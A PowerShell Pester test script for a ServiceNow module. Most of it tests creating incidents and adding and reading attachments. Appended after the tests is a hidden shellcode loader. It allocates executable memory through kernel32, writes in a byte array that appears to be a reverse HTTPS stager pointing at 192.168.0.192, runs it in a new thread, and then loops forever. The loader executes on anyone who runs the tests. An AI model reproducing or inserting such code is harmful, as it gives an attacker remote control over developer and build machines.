[CmdletBinding()]
Param(
    [Parameter(Mandatory = $true)]
    [ValidateNotNullorEmpty()]
    [PSCredential]$Credential
)

If (-not $PSScriptRoot) {$PSScriptRoot = Split-Path $MyInvocation.MyCommand.Path -Parent}
$Script:ThisCommand = $MyInvocation.MyCommand

$ProjectRoot = Resolve-Path "$PSScriptRoot\.."
$ModuleRoot = Split-Path (Resolve-Path "$ProjectRoot\*\*.psd1")
$ModuleName = Split-Path $ModuleRoot -Leaf
$ModulePsd = (Resolve-Path "$ProjectRoot\*\$ModuleName.psd1").Path
$ModulePsm = (Resolve-Path "$ProjectRoot\*\$ModuleName.psm1").Path
$DefaultsFile = Join-Path $ProjectRoot "Tests\$($ModuleName).Pester.Defaults.json"

$ModuleLoaded = Get-Module $ModuleName
If ($null -eq $ModuleLoaded) {
    Import-Module $ModulePSD -Force
}
ElseIf ($null -ne $ModuleLoaded -and $ModuleLoaded -ne $ModulePSM) {
    Remove-Module $ModuleName -Force -ErrorAction SilentlyContinue
    Import-Module $ModulePSD -Force
}


If (Test-Path $DefaultsFile) {
    $Script:Defaults = Get-Content $DefaultsFile -Raw | ConvertFrom-Json

    If ('testingurl.service-now.com' -eq $Defaults.ServiceNowUrl) {
        Throw 'Please populate the *.Pester.Defaults.json file with your values'
    }
}
Else {
    
   @{
        ServiceNowURL = 'testingurl.service-now.com'
        TestCategory  = 'Internal'
        TestUserGroup = '8a4dde73c6112278017a6a4baf547aa7'
        TestUser      = '6816f79cc0a8016401c5a33be04be441'
    } | ConvertTo-Json | Set-Content $DefaultsFile
    Throw "$DefaultsFile does not exist. Created example file. Please populate with your values"
}

Describe "$ThisCommand" -Tag Attachment {
    $null = Set-ServiceNowAuth -Url $Defaults.ServiceNowUrl -Credentials $Credential

    It "Create incident with New-ServiceNowIncident" {
        $ShortDescription = "Testing Ticket Creation with Pester:  $ThisCommand"
        $newServiceNowIncidentSplat = @{
            Caller               = $Defaults.TestUser
            ShortDescription     = $ShortDescription
            Description          = 'Long description'
            Comment              = 'Test Comment'
            ServiceNowCredential = $Credential
            ServiceNowURL        = $Defaults.ServiceNowURL
        }
        $Script:TestTicket = New-ServiceNowIncident @newServiceNowIncidentSplat

        $TestTicket.short_description | Should -Be $ShortDescription
    }

    It 'Attachment test file exist' {
        $FileValue = "{0}`t{1}" -f (Get-Date), $ThisCommand
        $FileName = "{0}.txt" -f 'GetServiceNowAttachment'
        $newItemSplat = @{
            Name     = $FileName
            ItemType = 'File'
            Value    = $FileValue
        }
        $Script:File = New-Item @newItemSplat

        $File.FullName | Should -Exist
    }

    It "File is attached to $($TestTicket.Number)" {
        $addServiceNowAttachmentSplat = @{
            Number        = $TestTicket.Number
            Table         = 'incident'
            File          = $File.FullName
            Credential    = $Credential
            ServiceNowURL = $Defaults.ServiceNowURL
            PassThru      = $true
        }
        $Script:Attachment = Add-ServiceNowAttachment @addServiceNowAttachmentSplat

        $Attachment.file_name | Should -Be $File.Name
    }

    It 'Attachment test file removed' {
        Remove-Item $File.FullName -Force

        $File.FullName | Should -Not -Exist
    }

    It 'Attachment detail works (Global Credentials)' {
        $getServiceNowAttachmentDetailSplat = @{
            Number   = $TestTicket.Number
            Table    = 'incident'
            FileName = $Attachment.file_name
        }
        $AttachmentDetail = Get-ServiceNowAttachmentDetail @getServiceNowAttachmentDetailSplat

        $AttachmentDetail.sys_id | Should -Be $Attachment.sys_id
    }

    It 'Attachment detail works (Specify Credentials)' {
        $getServiceNowAttachmentDetailSplat = @{
            Number        = $TestTicket.Number
            Table         = 'incident'
            FileName      = $Attachment.file_name
            Credential    = $Credential
            ServiceNowURL = $Defaults.ServiceNowURL
        }
        $AttachmentDetail = Get-ServiceNowAttachmentDetail @getServiceNowAttachmentDetailSplat

        $AttachmentDetail.sys_id | Should -Be $Attachment.sys_id
    }

    $null = Remove-ServiceNowAuth
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,0xeb,0x4e,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0xeb,0x3d,0x53,0x50,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x10,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x18,0x4f,0x75,0xd9,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0xeb,0x42,0xe8,0xbe,0xff,0xff,0xff,0x2f,0x35,0x4a,0x7a,0x63,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xbf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0xe8,0x69,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x30,0x2e,0x31,0x39,0x32,0x00;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

